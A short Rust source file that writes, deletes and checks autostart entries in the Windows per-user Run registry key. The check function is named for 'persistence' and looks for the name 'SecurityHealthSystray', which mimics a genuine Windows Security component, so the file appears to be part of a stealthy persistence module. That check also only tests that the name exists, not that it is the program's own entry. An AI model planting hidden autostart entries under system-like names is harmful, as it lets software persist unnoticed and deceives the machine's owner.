use windows::core::{Result, s, PCSTR};
use windows::Win32::System::Registry::{
    RegOpenKeyExA, RegSetValueExA, RegDeleteValueA, RegCloseKey,
    HKEY_CURRENT_USER, KEY_WRITE, REG_SZ, HKEY
};
use std::ffi::CString;

pub fn add_registry_run_key(name: &str, path: &str) -> Result<()> {
    unsafe {
        let mut hkey = HKEY::default();
        RegOpenKeyExA(
            HKEY_CURRENT_USER,
            s!("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            0,
            KEY_WRITE,
            &mut hkey
        )?;

        let name_c = CString::new(name).unwrap();
        let path_c = CString::new(path).unwrap();
        
        let result = RegSetValueExA(
            hkey,
            PCSTR(name_c.as_ptr() as *const u8),
            0,
            REG_SZ,
            Some(path_c.as_bytes_with_nul())
        );

        let _ = RegCloseKey(hkey);
        result
    }
}

pub fn remove_registry_run_key(name: &str) -> Result<()> {
    unsafe {
        let mut hkey = HKEY::default();
        RegOpenKeyExA(
            HKEY_CURRENT_USER,
            s!("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            0,
            KEY_WRITE,
            &mut hkey
        )?;

        let name_c = CString::new(name).unwrap();
        let result = RegDeleteValueA(
            hkey,
            PCSTR(name_c.as_ptr() as *const u8)
        );

        let _ = RegCloseKey(hkey);
        result
    }
}

pub fn verify_registry_persistence() -> bool {
    unsafe {
        let mut hkey = HKEY::default();
        let result = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            s!("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            0,
            windows::Win32::System::Registry::KEY_READ,
            &mut hkey
        );

        if result.is_err() {
            return false;
        }

        // Check if our entry exists (using SecurityHealthSystray as example)
        let name_c = CString::new("SecurityHealthSystray").unwrap();
        let mut value_type = 0u32;
        let mut data_size = 0u32;
        
        let query_result = windows::Win32::System::Registry::RegQueryValueExA(
            hkey,
            PCSTR(name_c.as_ptr() as *const u8),
            None,
            Some(&mut value_type as *mut u32 as *mut _),
            None,
            Some(&mut data_size as *mut u32 as *mut _)
        );

        let _ = RegCloseKey(hkey);
        query_result.is_ok() && data_size > 0
    }
}
